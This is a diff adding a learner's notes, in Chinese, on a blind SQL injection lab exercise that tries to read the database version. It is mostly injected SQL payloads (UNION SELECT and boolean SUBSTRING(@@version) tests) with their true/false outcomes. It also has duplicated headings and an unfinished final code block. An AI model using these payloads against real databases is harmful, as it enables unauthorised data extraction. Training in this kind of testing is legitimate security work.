@@ -1,15 +1,92 @@
 # SQL Injection (Blind)
 
+> Objective:
+Find the version of the SQL database software through a blind SQL attack.
+>
 
 > Objective:
 Find the version of the SQL database software through a blind SQL attack.
 >
+
+### 觀察
+這關也是改用 POST
+先透過上一關驗證一下 VERSION 語法
+
+```sql
+id=1 UNION select 1,VERSION(); &Submit=Submit
+```
+```sql
+id=1 UNION SELECT 1,SUBSTRING((SELECT @@version),1,20); &Submit=Submit
+```
+```sql
+SELECT 1,SUBSTRING((SELECT @@version),1,20);
+```
+
+```sql
+SELECT SUBSTRING((SELECT @@version),1,20);
+```
+
+```sql
+(SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%');
+```
+
+```sql
+id=1 AND (SELECT SUBSTRING((SELECT @@version),1,20)); &Submit=Submit
+```
+
+### 參考之前已經得知的版本
+
+```jsx
+10.1.26-MariaDB-0+de
+```
+
+false
+
+```sql
+1 AND (SELECT SUBSTRING((SELECT @@version),1,20) like '10.1.26%')
+```
+
+只能多嘗試，後來發現可能是單引號的問題，看起來是因為 POST data 的關係，payload 被視為字串，先換成 `=` 來測試
+
+```sql
+(SELECT SUBSTRING((SELECT @@version),1,1)) = 1
+```
+
+true (`User ID exists in the database.`)
+
+```sql
+id=1 AND (SELECT SUBSTRING((SELECT @@version),1,1)) = 1 &Submit=Submit
+```
+
+true (`User ID exists in the database.`)
+
+```sql
+id=1 AND (SELECT SUBSTRING((SELECT @@version),1,2)) = 10 &Submit=Submit
+```
+
+false
+
+```sql
+id=1 AND (SELECT SUBSTRING((SELECT @@version),1,2)) = 12 &Submit=Submit
+```
+
+...
+
+理論上應該是可以猜出 DB 的本版
+
+```sql
+id=1 AND (SELECT SUBSTRING((SELECT @@version),1,3)) = 10.);&Submit=Submit
+```
+
+### 卡關 QQ
 
 ### 卡關 QQ
 
 但如果再增加下去 10.x.x 的判斷會無效，崩潰
 
 換個環境再測 db 是 `5.7.34` ，也是第二個小數點之後無法正常判斷，頂多只能判斷到 5.7
+
+看提示說這關有使用 `mysql_real_escape_string()` ，會將 \x00, \n, \r, \, ', ", \x1a 跳脫
 
 ```sql
 id=1 AND (SELECT SUBSTRING((SELECT @@version),1,5)) = 10.10&Submit=Submit
